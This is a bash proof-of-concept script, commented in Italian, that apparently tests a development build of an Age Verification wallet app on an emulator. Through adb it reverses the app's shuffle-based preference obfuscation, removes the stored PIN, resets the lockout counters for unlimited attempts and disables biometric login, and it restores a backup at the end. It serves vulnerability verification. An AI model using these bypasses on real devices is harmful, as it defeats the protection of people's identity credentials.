#!/bin/bash
#
# AV Wallet Security Test Script
# Testa le vulnerabilita' nelle SharedPreferences dell'app Age Verification
#
# Prerequisiti: emulatore acceso, app installata, adb funzionante
#

ADB="${ANDROID_HOME:-$HOME/Library/Android/sdk}/platform-tools/adb"
PKG="com.scytales.av.dev"
PREFS_PATH="/data/data/$PKG/shared_prefs/eudi-wallet.xml"
BACKUP="/tmp/eudi-wallet-backup.xml"
TMP="/tmp/eudi-wallet-mod.xml"
FY_SEED="1,3,5,7,9,2,4,6,8"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo ""
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo ""
}

ok()   { echo -e "  ${GREEN}[+]${NC} $1"; }
fail() { echo -e "  ${RED}[-]${NC} $1"; }
info() { echo -e "  ${YELLOW}[*]${NC} $1"; }

read_prefs() {
    $ADB shell "run-as $PKG cat $PREFS_PATH" 2>/dev/null
}

write_prefs() {
    local src="$1"
    $ADB push "$src" /data/local/tmp/eudi-wallet.xml > /dev/null 2>&1
    $ADB shell "run-as $PKG cp /data/local/tmp/eudi-wallet.xml $PREFS_PATH" 2>/dev/null
}

restart_app() {
    $ADB shell am force-stop $PKG 2>/dev/null
    sleep 1
    $ADB shell monkey -p $PKG -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1
    sleep 2
}

# ------------------------------------------------------------------
banner "AV WALLET SECURITY TEST"
# ------------------------------------------------------------------

# Verifica connessione
if ! $ADB get-state > /dev/null 2>&1; then
    fail "Nessun emulatore/device connesso"
    exit 1
fi
ok "Device connesso"

# Verifica app installata
if ! $ADB shell pm list packages 2>/dev/null | grep -q "$PKG"; then
    fail "App $PKG non installata"
    exit 1
fi
ok "App $PKG trovata"

# Leggi stato attuale
CURRENT=$(read_prefs)
if [ -z "$CURRENT" ]; then
    fail "Impossibile leggere shared_prefs (app mai avviata?)"
    exit 1
fi
ok "SharedPreferences lette"

# Backup
echo "$CURRENT" > "$BACKUP"
ok "Backup salvato in $BACKUP"

echo ""
info "Stato attuale:"
echo "$CURRENT" | grep -E "Pin|Biometric|Lockout|Attempt|Crypto" | sed 's/^/       /'

# ------------------------------------------------------------------
banner "TEST 1: Decodifica offuscamento (shuffle)"
# ------------------------------------------------------------------

info "La 'crittografia' e' un Fisher-Yates shuffle con seed hardcoded..."

CRYPTO_ALIAS=$(echo "$CURRENT" | grep 'CryptoAlias' | sed 's/.*">//' | sed 's/<.*//')

if [ -n "$CRYPTO_ALIAS" ]; then
    DECODED=$(python3 << PYEOF
import base64
FY_SEED = [$FY_SEED]
def unshuffle(s, seed):
    items = list(s)
    for i in reversed(range(len(items))):
        k = seed[i % len(seed)] % len(items)
        items[k], items[i] = items[i], items[k]
    return ''.join(items)
shuffled = "$CRYPTO_ALIAS"
unshuffled = unshuffle(shuffled, FY_SEED)
padded = unshuffled + '=' * (4 - len(unshuffled) % 4) if len(unshuffled) % 4 else unshuffled
try:
    print(base64.b64decode(padded).decode('utf-8'))
except:
    print(unshuffled)
PYEOF
)
    ok "CryptoAlias offuscato: ${CRYPTO_ALIAS:0:30}..."
    ok "CryptoAlias decodificato: $DECODED"
else
    info "CryptoAlias non trovato (app non ancora configurata)"
fi

# ------------------------------------------------------------------
banner "TEST 2: PIN bypass"
# ------------------------------------------------------------------

HAS_PIN=$(echo "$CURRENT" | grep -c "PinEnc")

if [ "$HAS_PIN" -eq 0 ]; then
    info "Nessun PIN impostato. Imposta un PIN nell'app e riesegui."
    info "Salto questo test."
else
    info "PIN trovato in shared_prefs. Rimuovo PinEnc e PinIv..."

    echo "$CURRENT" | grep -v 'name="PinEnc"' | grep -v 'name="PinIv"' > "$TMP"
    write_prefs "$TMP"

    AFTER=$(read_prefs)
    if echo "$AFTER" | grep -q "PinEnc"; then
        fail "PinEnc ancora presente -- rimozione fallita"
    else
        ok "PinEnc e PinIv rimossi"
        info "Riavvio app..."
        restart_app
        ok "App riavviata -- controlla l'emulatore"
        ok "L'app dovrebbe mostrare la schermata di setup PIN"
        ok "Le credenziali nel wallet core sono INTATTE"

        echo ""
        read -p "  Premi INVIO dopo aver verificato sull'emulatore... "

        # Ripristino
        info "Ripristino backup..."
        write_prefs "$BACKUP"
        restart_app
        ok "PIN originale ripristinato"
    fi
fi

# ------------------------------------------------------------------
banner "TEST 3: Rate limiting bypass"
# ------------------------------------------------------------------

info "Imposto 9 tentativi falliti + lockout 8 ore..."

FUTURE_TS=$(python3 -c "import time; print(int(time.time()*1000) + 28800000)")

echo "$CURRENT" \
    | sed "s/name=\"PinFailedAttempts\" value=\"[0-9]*\"/name=\"PinFailedAttempts\" value=\"9\"/" \
    | sed "s/name=\"PinLockoutUntil\" value=\"[0-9]*\"/name=\"PinLockoutUntil\" value=\"$FUTURE_TS\"/" \
    > "$TMP"

write_prefs "$TMP"
restart_app

LOCKED=$(read_prefs)
ATTEMPTS=$(echo "$LOCKED" | grep "PinFailedAttempts" | grep -o 'value="[0-9]*"')
LOCKOUT=$(echo "$LOCKED" | grep "PinLockoutUntil" | grep -o 'value="[0-9]*"')

ok "PinFailedAttempts $ATTEMPTS"
ok "PinLockoutUntil $LOCKOUT"
info "L'app dovrebbe mostrare il lockout -- verifica sull'emulatore"

echo ""
read -p "  Premi INVIO per resettare il lockout... "

info "Reset: PinFailedAttempts=0, PinLockoutUntil=0..."

echo "$CURRENT" \
    | sed "s/name=\"PinFailedAttempts\" value=\"[0-9]*\"/name=\"PinFailedAttempts\" value=\"0\"/" \
    | sed "s/name=\"PinLockoutUntil\" value=\"[0-9]*\"/name=\"PinLockoutUntil\" value=\"0\"/" \
    > "$TMP"

write_prefs "$TMP"
restart_app

ok "Lockout azzerato -- l'app accetta di nuovo tentativi PIN"

echo ""
read -p "  Premi INVIO dopo aver verificato... "

# ------------------------------------------------------------------
banner "TEST 4: Biometric bypass"
# ------------------------------------------------------------------

BIO_STATUS=$(echo "$CURRENT" | grep "UseBiometricsAuth" | grep -o 'value="[a-z]*"')
info "Stato attuale: UseBiometricsAuth $BIO_STATUS"

if echo "$BIO_STATUS" | grep -q "true"; then
    info "Biometria attiva. Disabilito..."

    sed 's/name="UseBiometricsAuth" value="true"/name="UseBiometricsAuth" value="false"/' \
        "$BACKUP" > "$TMP"
    write_prefs "$TMP"
    restart_app
    ok "UseBiometricsAuth impostato a false"
    ok "Biometria bypassata -- l'app chiede solo il PIN"
else
    info "Biometria gia' disabilitata (value=\"false\")"
    info "Il flag e' un semplice booleano in chiaro nelle SharedPreferences"
    info "Su un device con biometria attiva, basta cambiarlo a false"
    ok "Vulnerabilita' confermata per design"
fi

# ------------------------------------------------------------------
banner "TEST 5: Dump completo SharedPreferences"
# ------------------------------------------------------------------

info "Contenuto completo del file eudi-wallet.xml:"
echo ""
read_prefs | sed 's/^/       /'

# ------------------------------------------------------------------
banner "RIPRISTINO"
# ------------------------------------------------------------------

info "Ripristino stato originale..."
write_prefs "$BACKUP"
restart_app
ok "Stato originale ripristinato"

# ------------------------------------------------------------------
banner "RIEPILOGO"
# ------------------------------------------------------------------

echo -e "  ${RED}VULN-01${NC}  PIN non legato al vault credentials"
echo -e "           Rimuovendo PinEnc/PinIv si resetta il PIN"
echo -e "           senza invalidare le credenziali"
echo ""
echo -e "  ${RED}VULN-02${NC}  Rate limiting client-side"
echo -e "           PinFailedAttempts e PinLockoutUntil in chiaro"
echo -e "           Reset a 0 = tentativi infiniti"
echo ""
echo -e "  ${RED}VULN-03${NC}  Biometric bypass"
echo -e "           UseBiometricsAuth = booleano editabile"
echo ""
echo -e "  ${RED}VULN-04${NC}  Falsa crittografia SharedPreferences"
echo -e "           Solo shuffle con seed hardcoded [1,3,5,7,9,2,4,6,8]"
echo -e "           Reversibile senza chiave"
echo ""
echo -e "  ${RED}VULN-05${NC}  MITM pattern nel README ufficiale"
echo -e "           TrustAllX509TrustManager documentato in how_to_build.md"
echo ""
echo -e "  ${YELLOW}File testato:${NC}  $PREFS_PATH"
echo -e "  ${YELLOW}Backup:${NC}        $BACKUP"
echo ""
